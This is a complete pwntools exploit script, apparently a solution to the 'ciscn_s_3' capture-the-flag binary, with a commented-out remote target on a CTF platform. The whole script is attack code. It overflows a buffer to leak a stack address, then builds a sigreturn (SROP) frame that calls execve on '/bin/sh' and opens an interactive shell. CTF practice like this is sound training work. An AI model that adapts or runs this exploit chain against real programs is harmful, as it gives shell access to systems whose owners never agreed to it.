# coding:utf-8
#!/usr/bin/python
from pwn import *
context.update(arch='amd64',os='linux',timeout=1)
sh = process("./ciscn_s_3")
# sh = remote("node3.buuoj.cn",27531)
# sh = remote("")
vuln_addr = 0x4004f1
syscall = 0x400517
sigreturn = 0x4004DA
gdb.attach(sh)
# pause()
payload = '/bin/sh\x00'.ljust(16,'a') + p64(vuln_addr)
sh.sendline(payload)
sh.recv(0x20)
stack = u64(sh.recv(8))
buf_addr = stack - 0x118
log.info("success get buf_addr:0x%x"%buf_addr)
sigFrame = SigreturnFrame()
sigFrame.rax = constants.SYS_execve
sigFrame.rdi = buf_addr
sigFrame.rsi = 0
sigFrame.rdx = 0
sigFrame.rip = syscall
payload = 'a' *0x10 + p64(sigreturn) + p64(syscall) + str(sigFrame)
sh.sendline(payload)
sh.interactive()